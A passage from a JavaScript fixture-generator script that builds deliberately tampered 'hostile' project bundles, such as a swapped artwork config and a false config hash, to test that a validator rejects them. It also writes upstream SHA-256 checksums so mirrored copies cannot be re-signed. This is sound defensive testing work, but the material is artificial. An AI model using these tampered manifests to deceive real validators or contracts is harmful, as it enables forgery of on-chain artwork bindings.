        layers: [{ kind: "BARS", sensor: "EPOCH", curve: "STEP", palette: 1, amountMin: 1, amountMax: 2 }],
        traits: [],
      });
      m.artBinding.artConfig = bytesToHex(swapped);
      m.artBinding.artConfigBytes = swapped.length;
      m.artBinding.artConfigHash = keccak256Hex(swapped);
    }),
  }),
  {
    attack: "a manifest carrying a different artwork than the creator's parameters describe",
    refusedBy: "validator",
    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_MISMATCH"] },
    note: "Every field is self-consistent and the configuration is perfectly valid ACV1. It is refused because the binding is RECOMPUTED from generator/params.json, so a manifest cannot describe art the project does not contain.",
  },
);

emit(
  "art-config-hash-lie.relics",
  withSolidityEntries({
    "relics.project.json": solidityManifestWith((m) => {
      m.artBinding.artConfigHash = keccak256Hex(utf8("not the configuration"));
    }),
  }),
  {
    attack: "a config hash that is not keccak256 of the config beside it",
    refusedBy: "validator",
    expect: { checkFails: "ART_BINDING", codes: ["ART_BINDING_CONFIG_HASH", "ART_BINDING_MISMATCH"] },
    note: "On chain this is BadArtHash in LaunchpadFactory._storeArt. Here it costs nothing to discover.",
  },
);

function hexToBytes(hex) {
  const out = new Uint8Array(hex.length / 2);
  for (let i = 0; i < out.length; i++) out[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
  return out;
}

function bytesToHex(bytes) {
  return [...bytes].map((b) => b.toString(16).padStart(2, "0")).join("");
}

writeFileSync(
  join(HOSTILE, "expectations.json"),
  stableJsonText({
    note: "Generated by packages/project-schema/fixtures/build.mjs. Every bundle here MUST be refused. `refusedBy` says which layer is expected to refuse it: container = readContainer throws; parser = safeJsonParse; validator = validateBundle reports errors; sandbox = the isolated execution backend. Fixtures marked requiresExecution only fail when the host supplies an evaluate capability.",
    fixtures: hostile,
  }),
);

// ---------------------------------------------------------------------------------------------
// CHECKSUMS.json — the corpus's digests, AUTHORED HERE.
//
// The monorepo mirrors this corpus and has to verify it. Until now it verified against digests its
// own sync step computed from the same files it was checking, which is a checksum of a checksum:
// tamper with a mirrored bundle, re-run the sync, and every gate goes green because the numbers
// were regenerated from the tampered bytes. Independent verification proved exactly that.
//
// This file breaks the loop by moving the authority upstream. These digests are written HERE, in
// the public repository, and this repository's CI runs `npm run kit:fixtures` and then
// `git diff --exit-code` over this directory — so a committed CHECKSUMS.json provably matches what
// the generator produces from the committed sources. The monorepo TRANSPORTS this file rather than
// recomputing it, and checks its mirrored bundles against these numbers. A tampered mirror can no
// longer be re-signed downstream: the digests it must match live in a different repository, under
// a different CI, pinned by commit.
const checksums = {
  note: "AUTHORED by packages/project-schema/fixtures/build.mjs in the relicsv4 repository, and guarded by its CI (`kit:fixtures` then `git diff --exit-code`). Consumers that mirror this corpus MUST verify against these digests and MUST NOT recompute their own — a corpus checked against numbers derived from itself proves nothing. Digests are sha256 of the raw .relics bytes.",
  schemaVersion: SCHEMA_VERSION,
  creatorKitVersion: CREATOR_KIT_VERSION,
  corpora: {},
};
for (const [dir, files] of [
  ["parity", readdirSync(PARITY).filter((f) => f.endsWith(".relics")).sort()],
  ["hostile", readdirSync(HOSTILE).filter((f) => f.endsWith(".relics")).sort()],
]) {
  const bundles = {};
  for (const file of files) {
    const raw = readFileSync(join(dir === "parity" ? PARITY : HOSTILE, file));
    bundles[file] = { bytes: raw.length, sha256: sha256Bytes_(raw) };
  }
  checksums.corpora[dir] = { bundleCount: files.length, bundles };
}
checksums.bundleCount = Object.values(checksums.corpora).reduce((n, c) => n + c.bundleCount, 0);
writeFileSync(join(HERE, "CHECKSUMS.json"), stableJsonText(checksums));

console.log(`parity: ${parity.length} bundles`);
console.log(`hostile: ${hostile.length} bundles`);
console.log(`checksums: ${checksums.bundleCount} bundles signed upstream`);
